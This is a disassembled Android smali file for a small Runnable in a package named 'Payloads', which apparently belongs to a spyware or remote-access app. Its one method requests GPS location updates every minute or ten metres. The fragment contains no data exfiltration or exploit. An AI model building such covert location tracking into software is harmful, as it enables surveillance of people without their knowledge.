.class Lcom/android/ld/Payloads/locManager$2;
.super Ljava/lang/Object;
.source "locManager.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/android/ld/Payloads/locManager;->getGPSLocation()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/android/ld/Payloads/locManager;


# direct methods
.method constructor <init>(Lcom/android/ld/Payloads/locManager;)V
    .locals 0
    .param p1, "this$0"    # Lcom/android/ld/Payloads/locManager;

    .line 65
    iput-object p1, p0, Lcom/android/ld/Payloads/locManager$2;->this$0:Lcom/android/ld/Payloads/locManager;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 7

    .line 68
    iget-object v0, p0, Lcom/android/ld/Payloads/locManager$2;->this$0:Lcom/android/ld/Payloads/locManager;

    iget-object v1, v0, Lcom/android/ld/Payloads/locManager;->mLocationManager:Landroid/location/LocationManager;

    new-instance v6, Lcom/android/ld/Payloads/locManager$2$1;

    invoke-direct {v6, p0}, Lcom/android/ld/Payloads/locManager$2$1;-><init>(Lcom/android/ld/Payloads/locManager$2;)V

    const-string v2, "gps"

    const-wide/32 v3, 0xea60

    const/high16 v5, 0x41200000    # 10.0f

    invoke-virtual/range {v1 .. v6}, Landroid/location/LocationManager;->requestLocationUpdates(Ljava/lang/String;JFLandroid/location/LocationListener;)V

    .line 82
    return-void
.end method
